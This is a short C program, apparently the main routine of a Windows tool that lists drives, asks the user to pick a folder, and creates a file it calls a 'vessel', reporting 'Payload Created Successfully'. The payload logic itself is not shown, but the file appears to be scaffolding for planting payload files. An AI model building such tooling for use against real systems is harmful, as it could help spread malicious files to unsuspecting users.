#include "Printers.h"
#include "choosers.h"
#include "Externals.h"

int main(void) 
{
	call();
	WCHAR pFilepath[MAX_PATH] = {L'\0'};
	WCHAR pAvailableCharacters[27] = { L'\0' };
	if (PrintDrives(&pFilepath, &pAvailableCharacters) == FALSE) {
		printf("[X] Failed To Fetch Drives!\n[X] Exiting With Error Code: %x\n", GetLastError());
		return -1; 
	}
	while (ChooseDrive(&pFilepath, &pAvailableCharacters) == FALSE) {
		printf("[X] Wrong Input!\n");
		PrintDrives(&pFilepath, &pAvailableCharacters);
	}
	if (PrintSubFolders(&pFilepath) == FALSE) 
	{
		printf("[X] Folder Choosing || Printing Failed!\n[X] Exiting With Error Code : % x\n", GetLastError());
		return -2;
	}
	HANDLE hFile = CreateVessel(&pFilepath);
	if (hFile == INVALID_HANDLE_VALUE) 
	{
		printf("[X] Failed To Fetch File Handle!\n[X] Exiting With Error Code: %x\n", GetLastError());
		return -3;
	}
	printf("[#] Payload Created Successfully! :)\n");
	printf("[#] Press 'Enter' To Exit! :)");
	return 0;
}

